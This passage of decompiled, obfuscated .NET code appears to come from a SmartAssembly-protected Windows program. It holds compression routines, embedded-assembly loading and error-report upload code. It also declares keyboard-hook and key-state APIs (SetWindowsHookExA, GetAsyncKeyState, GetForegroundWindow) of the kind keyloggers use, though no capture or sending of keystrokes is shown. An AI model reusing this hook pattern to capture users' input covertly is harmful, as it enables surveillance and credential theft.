	static void smethod_93(Class44 proxy, IWebProxy iwebProxy_0)
	{
		proxy.iwebProxy_0 = iwebProxy_0;
	}

	static bool smethod_94(Class20.Class29 class29_0)
	{
		return class29_0.int_18 == class29_0.int_17;
	}

	static void smethod_95(Class46 whenDone, Delegate4 delegate4_0)
	{
		if (whenDone.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (whenDone.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(whenDone.iwebProxy_0);
				}
				whenDone.string_2 = uploadReportLoginService.GetServerURL(whenDone.string_1);
				if (whenDone.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (whenDone.string_2 == "ditto")
				{
					whenDone.string_2 = Class46.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate4_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate4_0(whenDone.string_2.StartsWith("ERR") ? whenDone.string_2 : "OK");
	}

	unsafe static int smethod_96(Class20.Class27.Class28 class28_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class28_0.short_0.Length)
		{
			*(int*)ptr += class28_0.short_0[*(int*)((byte*)ptr + 4)] * class28_0.byte_0[*(int*)((byte*)ptr + 4)];
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = *(int*)ptr;
		return *(int*)((byte*)ptr + 8);
	}

	static void smethod_97()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class32.smethod_115;
		}
		catch
		{
		}
	}

	static void smethod_98(Class20.Class23 abyte, int int_0)
	{
		if (abyte.int_3++ == 32768)
		{
			throw new InvalidOperationException();
		}
		abyte.byte_0[abyte.int_2++] = (byte)int_0;
		abyte.int_2 &= 32767;
	}

	static void smethod_99(Exception exception, object o1, object o2, object o3, object o4)
	{
		Class32.smethod_28(exception, new object[4] { o1, o2, o3, o4 });
	}

	static bool smethod_100()
	{
		Class32.smethod_68((Class44)new Class45());
		return true;
	}

	unsafe static bool smethod_101(Assembly executingAssembly, Assembly callingAssembly)
	{
		void* ptr = stackalloc byte[5];
		byte[] publicKey = executingAssembly.GetName().GetPublicKey();
		byte[] publicKey2 = callingAssembly.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			((byte*)ptr)[4] = 0;
		}
		else
		{
			if (publicKey2 != null)
			{
				*(int*)ptr = 0;
				while (*(int*)ptr < publicKey2.Length)
				{
					if (publicKey2[*(int*)ptr] != publicKey[*(int*)ptr])
					{
						goto IL_0051;
					}
					(*(int*)ptr)++;
				}
			}
			((byte*)ptr)[4] = 1;
		}
		goto IL_005f;
		IL_0051:
		((byte*)ptr)[4] = 0;
		goto IL_005f;
		IL_005f:
		return ((byte*)ptr)[4] != 0;
	}

	static byte[] smethod_102(byte[] buffer)
	{
		return Class32.smethod_134(1, (byte[])null, (byte[])null, buffer);
	}

	static void smethod_103(Class44 sender, object sendingReportFeedbackEventArgs, EventArgs3 eventArgs3_0)
	{
		sender.delegate3_0?.Invoke(sendingReportFeedbackEventArgs, eventArgs3_0);
	}

	static string smethod_104()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	unsafe static bool smethod_105(bool flush, Class20.Class29 finish, bool bool_0)
	{
		void* ptr = stackalloc byte[29];
		if (finish.int_15 < 262 && !bool_0)
		{
			((byte*)ptr)[28] = 0;
		}
		else
		{
			while (true)
			{
				if (finish.int_15 >= 262 || bool_0)
				{
					Class20.Class27 class27_3;
					byte[] byte_;
					if (finish.int_15 != 0)
					{
						if (finish.int_14 >= 65274)
						{
							Class32.smethod_57(finish);
						}
						*(int*)ptr = finish.int_11;
						int int_ = finish.int_12;
						if (finish.int_15 >= 3)
						{
							*(int*)((byte*)ptr + 4) = Class32.smethod_8(finish);
							if (*(int*)((byte*)ptr + 4) != 0 && finish.int_14 - *(int*)((byte*)ptr + 4) <= 32506 && Class32.smethod_143(finish, *(int*)((byte*)ptr + 4)) && finish.int_12 <= 5 && finish.int_12 == 3 && finish.int_14 - finish.int_11 > 4096)
							{
								finish.int_12 = 2;
							}
						}
						if (int_ >= 3 && finish.int_12 <= int_)
						{
							Class20.Class27 class27_ = finish.class27_0;
							*(int*)((byte*)ptr + 20) = finish.int_14 - 1 - *(int*)ptr;
							Class32.smethod_140(*(int*)((byte*)ptr + 20), int_, class27_);
							int_ -= 2;
							do
							{
								finish.int_14++;
								finish.int_15--;
								if (finish.int_15 >= 3)
								{
									Class32.smethod_8(finish);
								}
							}
							while (--int_ > 0);
							finish.int_14++;
							finish.int_15--;
							finish.bool_0 = false;
							finish.int_12 = 2;
						}
						else
						{
							if (finish.bool_0)
							{
								Class20.Class27 class27_2 = finish.class27_0;
								*(int*)((byte*)ptr + 16) = finish.byte_0[finish.int_14 - 1] & 0xFF;
								Class32.smethod_131(*(int*)((byte*)ptr + 16), class27_2);
							}
							finish.bool_0 = true;
							finish.int_14++;
							finish.int_15--;
						}
						if (Class32.smethod_20(finish.class27_0))
						{
							*(int*)((byte*)ptr + 8) = finish.int_14 - finish.int_13;
							if (finish.bool_0)
							{
								(*(int*)((byte*)ptr + 8))--;
							}
							bool flag = flush && finish.int_15 == 0 && !finish.bool_0;
							class27_3 = finish.class27_0;
							byte_ = finish.byte_0;
							*(int*)((byte*)ptr + 12) = finish.int_13;
							Class32.smethod_0(*(int*)((byte*)ptr + 12), flag, byte_, class27_3, *(int*)((byte*)ptr + 8));
							finish.int_13 += *(int*)((byte*)ptr + 8);
							((byte*)ptr)[28] = ((!flag) ? ((byte)1) : ((byte)0));
							break;
						}
						continue;
					}
					if (finish.bool_0)
					{
						Class20.Class27 class27_2 = finish.class27_0;
						*(int*)((byte*)ptr + 16) = finish.byte_0[finish.int_14 - 1] & 0xFF;
						Class32.smethod_131(*(int*)((byte*)ptr + 16), class27_2);
					}
					finish.bool_0 = false;
					class27_3 = finish.class27_0;
					byte_ = finish.byte_0;
					*(int*)((byte*)ptr + 12) = finish.int_13;
					*(int*)((byte*)ptr + 24) = finish.int_14 - finish.int_13;
					Class32.smethod_0(*(int*)((byte*)ptr + 12), flush, byte_, class27_3, *(int*)((byte*)ptr + 24));
					finish.int_13 = finish.int_14;
					((byte*)ptr)[28] = 0;
					break;
				}
				((byte*)ptr)[28] = 1;
				break;
			}
		}
		return ((byte*)ptr)[28] != 0;
	}

	static void smethod_106(bool run, Control3 control3_0)
	{
		control3_0.timer_0.set_Enabled(run);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	static void smethod_107(Exception exception, object o1, object o2, object o3, object o4, object o5, object o6)
	{
		Class32.smethod_28(exception, new object[6] { o1, o2, o3, o4, o5, o6 });
	}

	static void smethod_108(Class20.Class26 class26_0)
	{
		class26_0.int_6 |= 12;
	}

	static byte[] smethod_109(EventArgs1 eventArgs1_0)
	{
		return Class32.smethod_55(eventArgs1_0.class35_0);
	}

	static void smethod_110(Control0 control0_0)
	{
		Class32.smethod_159(string.Empty, control0_0);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SetWindowsHookExA(int idHook, Form1.Delegate0 lpfn, int hmod, int dwThreadId);

	static void smethod_111(Exception exception, object o1, object o2, object o3, object o4, object o5, object o6, object o7, object o8, object o9)
	{
		Class32.smethod_28(exception, new object[9] { o1, o2, o3, o4, o5, o6, o7, o8, o9 });
	}

	unsafe static int smethod_112(byte[] buf, int offset, Class20.Class21 len, int int_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (true)
		{
			if (len.int_17 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class32.smethod_9(offset, buf, int_0, len.class23_0);
				int_0 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				offset -= *(int*)((byte*)ptr + 4);
				if (offset == 0)
				{
					*(int*)((byte*)ptr + 8) = *(int*)ptr;
					break;
				}
			}
			if (!Class32.smethod_21(len) && (Class32.smethod_85(len.class23_0) <= 0 || len.int_17 == 11))
			{
				*(int*)((byte*)ptr + 8) = *(int*)ptr;
				break;
			}
		}
		return *(int*)((byte*)ptr + 8);
	}

	static void smethod_113(Class20.Class23 class23_0)
	{
		int num = 0;
		class23_0.int_2 = 0;
		class23_0.int_3 = 0;
	}

	static string smethod_114(string value)
	{
		if (value.StartsWith("\"<RSAKeyValue>") && value.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return value;
	}

	unsafe static Assembly smethod_115(object sender, ResolveEventArgs e)
	{
		void* ptr = stackalloc byte[18];
		Class8.Struct1 @struct = new Class8.Struct1(e.Name);
		string s = @struct.method_0(includeVersion: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezkyNTU1MWRkLTZmNTYtNGNmMi1iMTcyLTRkMmNiNmI4ZmEyY30sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{15b9cc13-18cc-4780-a1f6-73ee385bf6b2},ezkyNTU1MWRkLTZmNTYtNGNmMi1iMTcyLTRkMmNiNmI4ZmEyY30=,[z]{15b9cc13-18cc-4780-a1f6-73ee385bf6b2}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		((byte*)ptr)[16] = 0;
		((byte*)ptr)[17] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length - 1)
		{
			if (!(array[*(int*)ptr] == text))
			{
				*(int*)ptr += 2;
				continue;
			}
			text2 = array[*(int*)ptr + 1];
			break;
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array.Length - 1)
			{
				if (!(array[*(int*)((byte*)ptr + 4)] == text))
				{
					*(int*)((byte*)ptr + 4) += 2;
					continue;
				}
				text2 = array[*(int*)((byte*)ptr + 4) + 1];
				break;
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				*(int*)((byte*)ptr + 8) = text2.IndexOf(']');
				string text3 = text2.Substring(1, *(int*)((byte*)ptr + 8) - 1);
				((byte*)ptr)[16] = ((text3.IndexOf('z') >= 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[17] = ((text3.IndexOf('t') >= 0) ? ((byte)1) : ((byte)0));
				text2 = text2.Substring(*(int*)((byte*)ptr + 8) + 1);
			}
			Assembly result;
			lock (Class8.hashtable_0)
			{
				if (Class8.hashtable_0.ContainsKey(text2))
				{
					result = (Assembly)Class8.hashtable_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_02a9;
					}
					*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
					manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
					if (((byte*)ptr)[16] != 0)
					{
						array2 = Class32.smethod_65(array2);
					}
					Assembly assembly = null;
					if (((byte*)ptr)[17] == 0)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							((byte*)ptr)[17] = 1;
						}
						catch (BadImageFormatException)
						{
							((byte*)ptr)[17] = 1;
						}
					}
					if (((byte*)ptr)[17] != 0)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class32.MoveFileEx(text5, (string)null, 4);
								Class32.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class8.hashtable_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_02a9;
		IL_02a9:
		return null;
	}

	static void smethod_116(int buf, byte[] off, int len, Class20.Class22 class22_0)
	{
		if (class22_0.int_0 < class22_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = len + buf;
		if (0 <= len && len <= num && num <= off.Length)
		{
			if (((uint)buf & (true ? 1u : 0u)) != 0)
			{
				class22_0.uint_0 |= (uint)((off[len++] & 0xFF) << class22_0.int_2);
				class22_0.int_2 += 8;
			}
			class22_0.byte_0 = off;
			class22_0.int_0 = len;
			class22_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	unsafe static void smethod_117(Class20.Class27 class27_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)ptr = 0;
		while (*(int*)ptr < class27_0.int_9)
		{
			*(int*)((byte*)ptr + 4) = class27_0.byte_1[*(int*)ptr] & 0xFF;
			int num = class27_0.short_0[*(int*)ptr];
			if (num-- != 0)
			{
				*(int*)((byte*)ptr + 8) = Class32.smethod_138(class27_0, *(int*)((byte*)ptr + 4));
				Class32.smethod_51(class27_0.class28_0, *(int*)((byte*)ptr + 8));
				*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
				if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
				{
					Class32.smethod_54(class27_0.class30_0, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
				*(int*)((byte*)ptr + 16) = Class32.smethod_37(class27_0, num);
				Class32.smethod_51(class27_0.class28_1, *(int*)((byte*)ptr + 16));
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
				if (*(int*)((byte*)ptr + 12) > 0)
				{
					Class32.smethod_54(class27_0.class30_0, num & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
			}
			else
			{
				Class32.smethod_51(class27_0.class28_0, *(int*)((byte*)ptr + 4));
			}
			(*(int*)ptr)++;
		}
		Class32.smethod_51(class27_0.class28_0, 256);
	}

	static void smethod_118(Class20.Class27 class27_0)
	{
		class27_0.int_9 = 0;
		class27_0.int_10 = 0;
	}

	static ICryptoTransform smethod_119(byte[] key, Class18 iv, bool decrypt, byte[] byte_0)
	{
		iv.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(iv.object_0, new object[1] { key });
		iv.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(iv.object_0, new object[1] { byte_0 });
		MethodInfo method = iv.type_0.GetMethod(decrypt ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(iv.object_0, new object[0]);
	}

	static void smethod_120(Class20.Class22 n, int int_0)
	{
		n.uint_0 >>= int_0;
		n.int_2 -= int_0;
	}

	unsafe static void smethod_121(Class20.Class27.Class28 blTree, Class20.Class27.Class28 class28_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < blTree.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = blTree.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					Class32.smethod_51(class28_0, *(int*)((byte*)ptr + 16));
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < blTree.int_1 && *(int*)((byte*)ptr + 8) == blTree.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				while (num-- > 0)
				{
					Class32.smethod_51(class28_0, *(int*)((byte*)ptr + 8));
				}
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				Class32.smethod_51(class28_0, 16);
				Class32.smethod_54(blTree.class27_0.class30_0, num - 3, 2);
			}
			else if (num <= 10)
			{
				Class32.smethod_51(class28_0, 17);
				Class32.smethod_54(blTree.class27_0.class30_0, num - 3, 3);
			}
			else
			{
				Class32.smethod_51(class28_0, 18);
				Class32.smethod_54(blTree.class27_0.class30_0, num - 11, 7);
			}
		}
	}

	static void smethod_122(Form1 form1_0)
	{
		if (Conversions.ToBoolean(Class32.smethod_38(form1_0)) && Class32.UnhookWindowsHookEx((int)form1_0.intptr_0) != 0)
		{
			form1_0.intptr_0 = (IntPtr)0;
		}
	}

	static void smethod_123(Exception exception)
	{
		Class32.smethod_28(exception, new object[0]);
	}

	static Icon smethod_124(string key)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + key + ".ico");
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_125(Class20.Class29 class29_0)
	{
		if (class29_0.int_14 >= 65274)
		{
			Class32.smethod_57(class29_0);
		}
		while (class29_0.int_15 < 262 && class29_0.int_17 < class29_0.int_18)
		{
			int num = 65536 - class29_0.int_15 - class29_0.int_14;
			if (num > class29_0.int_18 - class29_0.int_17)
			{
				num = class29_0.int_18 - class29_0.int_17;
			}
			Array.Copy(class29_0.byte_1, class29_0.int_17, class29_0.byte_0, class29_0.int_14 + class29_0.int_15, num);
			class29_0.int_17 += num;
			class29_0.int_16 += num;
			class29_0.int_15 += num;
		}
		if (class29_0.int_15 >= 3)
		{
			Class32.smethod_139(class29_0);
		}
	}

	static Assembly[] smethod_126(Class35 class35_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class32.smethod_42() };
		}
	}

	static void smethod_127(IWebProxy proxy, Class46 class46_0)
	{
		class46_0.iwebProxy_0 = proxy;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetAsyncKeyState(int vKey);

	[DllImport("gdi32.dll")]
	static extern IntPtr SelectObject(IntPtr hDC, IntPtr hGdiObj);

	static void smethod_128(Class44 sender, object eventArgs, EventArgs eventArgs_0)
	{
		sender.eventHandler_0?.Invoke(eventArgs, eventArgs_0);
	}

	static void smethod_129(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class32.smethod_24("current");
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static void smethod_130(string data, byte[] email, Delegate4 appFriendlyName, Class46 buildFriendlyNumber, string whenDone, string string_0)
	{
		try
		{
			ReportingService reportingService = new ReportingService(buildFriendlyNumber.string_2);
			if (buildFriendlyNumber.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(buildFriendlyNumber.iwebProxy_0);
			}
			appFriendlyName(reportingService.UploadReport2(buildFriendlyNumber.string_1, email, data, string_0, whenDone));
		}
		catch (Exception ex)
		{
			appFriendlyName("ERR 2002: " + ex.Message);
		}
	}

	static bool smethod_131(int lit, Class20.Class27 class27_0)
	{
		class27_0.short_0[class27_0.int_9] = 0;
		class27_0.byte_1[class27_0.int_9++] = (byte)lit;
		short[] short_;
		short[] array = (short_ = class27_0.class28_0.short_0);
		nint num = lit;
		array[lit] = (short)(short_[num] + 1);
		return Class32.smethod_20(class27_0);
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetForegroundWindow();

	unsafe static bool smethod_132(byte[] reportData, Class34.Class38 notificationEmailSettings, Class34 class34_0)
	{
		byte[] data;
		try
		{
			data = Class32.smethod_102(reportData);
		}
		catch (Exception)
		{
			Class32.smethod_72(class34_0, Enum2.const_0, Class20.string_0);
			return false;
		}
		byte[] array = Class32.smethod_3(data, "<RSAKeyValue><Modulus>y2x79cfDrPKgOkExoMO76Biksen69BJQigkd8Nb/IfE/z8j7EOVnfOaD6YzrZRydl6Qt0GOUajSivYxDCNUXSgYm/rs943DAvSk7dfF6jqVJGXN5MQr7zk/U9FPLFCN26Fd33Sv4usioR0UGZyRaVRf3Nur4hFhQVLBoLIpuwQE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class32.smethod_72(class34_0, Enum2.const_0, Class33.string_0);
			return false;
		}
		Class32.smethod_30(class34_0, Enum2.const_1);
		Class46 @class = new Class46("d98c1dd4-008f-04b2-e980-0998ecf8427e");
		if (class34_0.iwebProxy_0 != null)
		{
			@class.iwebProxy_0 = class34_0.iwebProxy_0;
		}
		Class34.Class36 class2 = new Class34.Class36(class34_0, array, @class, notificationEmailSettings);
		Class32.smethod_95(@class, new Delegate4(class2, (nint)(delegate*<Class34.Class36, string, void>)(&Class32.smethod_26)));
		return class2.bool_0;
	}

	static void smethod_133(Exception exception, object o1, object o2, object o3)
	{
		Class32.smethod_28(exception, new object[3] { o1, o2, o3 });
	}

	unsafe static byte[] smethod_134(int buffer, byte[] version, byte[] key, byte[] iv)
	{
		void* ptr = stackalloc byte[64];
		try
		{
			Class20.Stream0 stream = new Class20.Stream0();
			switch (buffer)
			{
			case 0:
			{
				Class20.Class26 class2 = new Class20.Class26();
				DateTime now = DateTime.Now;
				*(long*)ptr = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				*(int*)((byte*)ptr + 40) = -1;
				uint num = *(uint*)((byte*)ptr + 40);
				int num2 = 0;
				int num3 = iv.Length;
				while (--num3 >= 0)
				{
					num = array8[(num ^ iv[num2++]) & 0xFF] ^ (num >> 8);
				}
				num ^= *(uint*)((byte*)ptr + 40);
				Class32.smethod_70(67324752, stream);
				Class32.smethod_157(20, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_157(8, stream);
				Class32.smethod_70((int)(*(long*)ptr), stream);
				Class32.smethod_70((int)num, stream);
				*(long*)((byte*)ptr + 8) = stream.Position;
				Class32.smethod_70(0, stream);
				Class32.smethod_70(iv.Length, stream);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class32.smethod_157(bytes.Length, stream);
				Class32.smethod_157(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class32.smethod_25(class2, iv);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					*(int*)((byte*)ptr + 44) = Class32.smethod_86(class2, array9);
					if (*(int*)((byte*)ptr + 44) <= 0)
					{
						break;
					}
					stream.Write(array9, 0, *(int*)((byte*)ptr + 44));
				}
				Class32.smethod_108(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					*(int*)((byte*)ptr + 48) = Class32.smethod_86(class2, array10);
					if (*(int*)((byte*)ptr + 48) <= 0)
					{
						break;
					}
					stream.Write(array10, 0, *(int*)((byte*)ptr + 48));
				}
				*(long*)((byte*)ptr + 16) = class2.TotalOut;
				Class32.smethod_70(33639248, stream);
				Class32.smethod_157(20, stream);
				Class32.smethod_157(20, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_157(8, stream);
				Class32.smethod_70((int)(*(long*)ptr), stream);
				Class32.smethod_70((int)num, stream);
				Class32.smethod_70((int)(*(long*)((byte*)ptr + 16)), stream);
				Class32.smethod_70(iv.Length, stream);
				Class32.smethod_157(bytes.Length, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_70(0, stream);
				Class32.smethod_70(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class32.smethod_70(101010256, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_157(0, stream);
				Class32.smethod_157(1, stream);
				Class32.smethod_157(1, stream);
				Class32.smethod_70(46 + bytes.Length, stream);
				Class32.smethod_70((int)(30 + bytes.Length + *(long*)((byte*)ptr + 16)), stream);
				Class32.smethod_157(0, stream);
				stream.Seek(*(long*)((byte*)ptr + 8), SeekOrigin.Begin);
				Class32.smethod_70((int)(*(long*)((byte*)ptr + 16)), stream);
				break;
			}
			case 1:
				Class32.smethod_70(25000571, stream);
				Class32.smethod_70(iv.Length, stream);
				*(int*)((byte*)ptr + 52) = 0;
				while (*(int*)((byte*)ptr + 52) < iv.Length)
				{
					byte[] array5 = new byte[Math.Min(2097151, iv.Length - *(int*)((byte*)ptr + 52))];
					Buffer.BlockCopy(iv, *(int*)((byte*)ptr + 52), array5, 0, array5.Length);
					*(long*)((byte*)ptr + 24) = stream.Position;
					Class32.smethod_70(0, stream);
					Class32.smethod_70(array5.Length, stream);
					Class20.Class26 @class = new Class20.Class26();
					Class32.smethod_25(@class, array5);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						*(int*)((byte*)ptr + 56) = Class32.smethod_86(@class, array6);
						if (*(int*)((byte*)ptr + 56) <= 0)
						{
							break;
						}
						stream.Write(array6, 0, *(int*)((byte*)ptr + 56));
					}
					Class32.smethod_108(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						*(int*)((byte*)ptr + 60) = Class32.smethod_86(@class, array7);
						if (*(int*)((byte*)ptr + 60) <= 0)
						{
							break;
						}
						stream.Write(array7, 0, *(int*)((byte*)ptr + 60));
					}
					*(long*)((byte*)ptr + 32) = stream.Position;
					stream.Position = *(long*)((byte*)ptr + 24);
					Class32.smethod_70((int)@class.TotalOut, stream);
					stream.Position = *(long*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 52) += array5.Length;
				}
				break;
			case 2:
			{
